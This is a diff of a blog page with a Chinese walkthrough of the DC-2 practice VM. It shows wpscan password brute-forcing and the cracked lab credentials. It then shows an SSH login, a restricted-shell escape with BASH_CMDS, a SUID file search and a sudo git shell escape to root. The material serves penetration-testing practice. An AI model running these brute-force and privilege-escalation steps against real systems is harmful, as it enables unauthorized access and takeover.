@@ -230,7 +230,8 @@
 <p>（6）wpscan爆破账号密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U user.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\86139\AppData\Roaming\Typora\typora-user-images\image-20240726153425000.png" alt="image-20240726153425000"></p>
+
+
 <p><img src="/2024/07/26/DC-2Try/7.png" alt="DC-Try"></p>
 <p>[SUCCESS] - jerry &#x2F; adipiscing<br>[SUCCESS] - tom &#x2F; parturient</p>
 <p>爆出来两个 登录	</p>
@@ -249,7 +250,7 @@
 
 <p>输入密码，不行</p>
 <p>换一个账号</p>
-<p>ssh <a href="mailto:&#116;&#x6f;&#109;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#52;&#57;&#46;&#x31;&#51;&#x31;">&#116;&#x6f;&#109;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#52;&#57;&#46;&#x31;&#51;&#x31;</a> -p 7744</p>
+<p>ssh <a href="mailto:&#x74;&#x6f;&#x6d;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#46;&#52;&#57;&#x2e;&#49;&#51;&#49;">&#x74;&#x6f;&#x6d;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#46;&#52;&#57;&#x2e;&#49;&#51;&#49;</a> -p 7744</p>
 <p>输入密码</p>
 <p>ok登进去了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls  #看到flag3.txt</span><br><span class="line">cat flag3.txt</span><br><span class="line">发现 rbash 禁了cat</span><br><span class="line"></span><br><span class="line">compgen -c   查看可以使用的命令</span><br><span class="line">有一个vi</span><br><span class="line">vi flag3.txt</span><br></pre></td></tr></table></figure>
@@ -269,7 +270,7 @@
 <p>rbash环境变量提权</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">export -p   查看环境变量</span><br><span class="line">exit退出vi提权</span><br><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br><span class="line"></span><br><span class="line">su jerry</span><br><span class="line">输入密码切换成功</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\86139\AppData\Roaming\Typora\typora-user-images\image-20240726160545123.png" alt="image-20240726160545123"></p>
+<p><img src="/2024/07/26/DC-2Try/9.png" alt="DC-Try"></p>
 <p>权限还是不够</p>
 <p>老一套</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
@@ -280,7 +281,7 @@
 
 <p>看到git是root权限</p>
 <p>git提权</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 sudo git help config</span><br><span class="line">G到最后 i转到insert</span><br><span class="line">输入 !/bin/bash   或者!&#x27;sh&#x27;  提权</span><br><span class="line">2 sudo git -p help</span><br><span class="line">!/bin/bash    </span><br><span class="line">到root下</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat /final-flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 sudo git help config</span><br><span class="line">G到最后 i转到insert</span><br><span class="line">输入 !/bin/bash   或者!&#x27;sh&#x27;  提权</span><br><span class="line">2 sudo git -p help</span><br><span class="line">!/bin/bash    </span><br><span class="line">到root下</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat /final-flag.txt</span><br><span class="line">出了</span><br></pre></td></tr></table></figure>
 
 
                     </div>
